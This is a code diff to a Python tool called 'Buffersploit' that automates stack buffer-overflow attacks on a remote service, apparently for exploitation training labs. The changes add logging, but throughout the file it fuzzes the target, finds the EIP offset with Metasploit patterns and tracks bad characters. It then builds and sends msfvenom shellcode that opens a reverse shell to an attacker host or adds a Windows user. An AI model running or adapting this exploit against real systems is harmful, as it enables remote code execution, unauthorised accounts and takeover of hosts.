@@ -4,6 +4,13 @@ import sys, socket, argparse, subprocess
 from binascii import hexlify 
 from colorama import Fore, Back, Style, init
 import codecs
+import logging
+
+#Logs
+logging.basicConfig(filename='logs', 
+                    level=logging.INFO,
+                    format='%(asctime)s %(message)s',
+                    datefmt='%d/%m/%Y %I:%M:%S %p')
 
 init(autoreset=True) # Colorama auto reset settings
 IP = ('192.168.1.108').encode('latin-1') # Update your Remote IP Address
@@ -39,88 +46,139 @@ def Crash():
 
     counter = 100
 
+    logging.info('Creating Buffer array with different Buffer size')
     while len(buffer) <= 100:
         buffer.append('A' * counter)
         counter = counter + 100
 
     for string in buffer:
+        logging.info("Fuzzing with {} bytes".format(len(string)))
+        
         print(Fore.RED + "Fuzzing with %s bytes"%len(string))
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((IP, PORT))
+        
         try:
+            logging.info("Trying to connect to {}:{}".format(IP.decode(),PORT))
+            
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP, PORT))
             s.send(bytes(cmd + string,"latin-1"))
             s.recv(1024)
-        except:
-            print(Fore.GREEN + "Program crashed while sending %s bytes"% str(len(string)-100))
+            
+        except Exception as e:
+            error = str(e).split("]")[-1].strip()
+            logging.info("Socker Error : {}".format(error))
+            logging.info("Program crashed while sending {} bytes".format(len(string)-100))
+            
+            if len(string)-100 > 0 :
+                print(Fore.GREEN + "Program crashed while sending %s bytes"% str(len(string)-100))
+            else:
+                print(Fore.RED + "Error : "+ error)
+            
             sys.exit()
         s.close()
 
 def sendPayload(buffer):
     try:
+        logging.info("Sending the Payload")
+        logging.info("Payload: {}".format(buffer))
+        
         print(Fore.RED + "Sending Payload ....")
         payload = cmd + buffer
-        print(payload)
+        
+        logging.info("Trying to connect to {}:{}".format(IP.decode(),PORT))
+        
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((IP, PORT))
         s.send(bytes(payload,"latin-1"))
         s.recv(1024)
         print(Fore.GREEN + "Payload Sent!")
         s.close()
+    except socket.error as e:
+        logging.info("Socker Error : {}".format(str(e).split("]")[-1]))
         
     except Exception as e:
-        print(e)
+        logging.info("Exception : Service is crashed or not Running")
+        
         print(Fore.GREEN + "Either the service crashed or it's not running")
 
 def pattern_create(length):
+    logging.info("Creating a pattern of length : {}".format(length))
+    
     print("Creating pattern of Length " + str(length))
     pattern = subprocess.run(["msf-pattern_create -l %s"%length], shell=True, stdout=subprocess.PIPE)
     pattern = pattern.stdout.decode('latin-1').strip()
+    
+    logging.info("Sending the Pattern to Host")
     sendPayload(pattern)
 
 def pattern_offset(offset):
+    logging.info("Finding the offset address for {}".format(offset))
+    
     print("Finding the offset address for " + offset)
     offset = subprocess.run(["msf-pattern_offset -q %s"%offset], shell=True, stdout=subprocess.PIPE)
+    
+    logging.info("Sending the Pattern to Host")
     print(offset.stdout.decode('latin-1'))
 
 def send_badchars():
+    logging.info("Sending Badchars")
+    logging.info("Badchars : {}".format(badcharlist))
+    
     print("Sending Badchars")
     buffer = "\x41" * EBP + "\x42" * 4 + "\x90" * NOPS + badcharlist + "\x43" * ( CRASH - EBP - 4 - NOPS)
     sendPayload(str(buffer))
 
 def remove_badchars(badchar):
+    logging.info("Removing the Bad character {} from List".format(badchar))
+    
     try:
+        logging.info("Reading the Bad character file")
         open('badchar.txt', 'r')
     except FileNotFoundError:
+        logging.info("badchar.txt file not found, Creating a file with Null Byte")
+        
         with open('badchar.txt', 'w') as f:
             f.write(r"\x00,")
             f.close()
     
     import itertools    
+    logging.info("Converting Bad character to list")
     new_badchar = [i for i in badcharlist]
+    
+    logging.info("Generating all 256 Character in Hexvalues")
     hex_digits = ["".join(i) for i in itertools.product("0123456789ABCDEF",repeat=2)][1:]
      
     Flag = False
+    logging.info("Reading badcharacters from file")
     with open('badchar.txt', 'r') as f:
         b = f.read().strip()
         f.close()
+        
+        logging.info("Spliting the Badchar with Comma Delimiter")
         for i in b.split(','):
             if i == badchar:
                 Flag = True
                 
             try:
+                logging.info("Find the index of Badchar")
                 index = hex_digits.index(str(i[-2:]).upper())
+                
+                logging.info("Remove the Bad character")
                 new_badchar.remove(new_badchar[index])
                 hex_digits.remove(hex_digits[index])
             except Exception as e:
-                print(e)
+                logging.info("Exception : {}".format(e))
 
     if not Flag:
+        logging.info("Removing {} bad character".format(badchar))
+        
         index = hex_digits.index(badchar[-2:].upper())    
         new_badchar.remove(new_badchar[index])
         hex_digits.remove(hex_digits[index])
     
     
     with open('badchar.txt', 'w') as f:
+        logging.info("Appending the new Bad character")
         if badchar not in b.split(','):
             b += badchar + ','
         f.write(b)
@@ -131,7 +189,10 @@ def remove_badchars(badchar):
     sendPayload(buffer)
 
 def shellcode(LHOST=None,LPORT=None):
+    
     if EIP == "":
+        logging.info("EIP location is empty.\n Set EIP Location")        
+        
         print("Please set the EIP Location.")
         print(Fore.RED + "Exiting...")
         sys.exit()
@@ -144,6 +205,8 @@ def shellcode(LHOST=None,LPORT=None):
         print(str(key)+" : "+value)
         
     choice = int(input(">> "))
+    
+    logging.info("Executing {}".format(modules[choice]))
     print(Fore.GREEN+"Executing {}".format(modules[choice]))
         
     if choice == 1:
@@ -151,6 +214,8 @@ def shellcode(LHOST=None,LPORT=None):
             LHOST = input("Enter LHOST IP Address : ")
             LPORT = input("Enter LPORT Number : ")
         print("Generating shellcode")
+        logging.info("Generating shellcode with LHOST={} LPORT={}".format(LHOST,LPORT))
+        
         with open('badchar.txt', 'r') as f:
             bd = f.read()
             bd = bd.replace(",","\\")
@@ -162,6 +227,8 @@ def shellcode(LHOST=None,LPORT=None):
         shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
         shellcode=codecs.decode(shellcode, 'unicode_escape')
         buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
+        
+        logging.info("Shellcode: {}".format(shellcode))
         sendPayload(buffer)
             
     if choice == 2:
@@ -169,18 +236,21 @@ def shellcode(LHOST=None,LPORT=None):
         with open('badchar.txt', 'r') as f:
             bd = f.read()
             bd = bd.replace(",","\\")
+        
+        logging.info("Generating Code for Adding User")
         command = "msfvenom -p windows/adduser -b '%s' -e x86/fnstenv_mov -f c" % bd[:-1]
         shellcode = subprocess.run([command], shell=True, stdout=subprocess.PIPE)
         shellcode = shellcode.stdout.decode('latin-1')
         shellcode = shellcode.split("\n",1)[1]
         shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
         shellcode=codecs.decode(shellcode, 'unicode_escape')
-       
+
+        logging.info("Shellcode: {}".format(shellcode))
         buffer = "\x41" * EBP + EIP + "\x90" * NOPS + shellcode + "\x43" * ( CRASH - EBP - 4 - NOPS)
         sendPayload(buffer)
 
 if __name__ == '__main__':
-
+        logging.info('Starting Buffersploit')
         print(Fore.CYAN+'''
         
 ██████╗ ██╗   ██╗███████╗███████╗███████╗██████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
@@ -191,7 +261,7 @@ if __name__ == '__main__':
 ╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                                  
         ''')
-
+        
         parser = argparse.ArgumentParser()
         parser.add_argument('-c', help='Crash bytes size', action='store_true')
         parser.add_argument('-l', help='Length for sending a random pattern')
@@ -203,22 +273,35 @@ if __name__ == '__main__':
         parser.add_argument('--P', help='Local Port for reverse shell')
         
         args = parser.parse_args()
-
+        
         if args.c:
+            logging.info('Performing Crash Operation')
             Crash()
         
         if args.l :
-            print("Please set the Value of CRASH = %s"%args.l)
+            logging.info('Performing Random Pattern Generation Operation')
+            if int(args.l)!= CRASH:
+                logging.info("Crash not equal to Patten length")
+                print("Crash value should be equal to {}".format(args.l))
+                logging.info("Exiting...")
+                exit()                
+                
             pattern_create(args.l)
 
         if args.q :
+            logging.info('Performing Operation to find Offset')
             pattern_offset(args.q)
 
         if args.b :
+            logging.info('Performing Operation to check Badchar')
             send_badchars()
 
         if args.br :
+            logging.info('Performing Operation to append new Badchar')
             remove_badchars(args.br)
 
         if args.s:
-            shellcode(args.L,args.P)    
+            logging.info('Performing Shellcode Operation')
+            shellcode(args.L,args.P)
+        
+        logging.info("Exiting...")
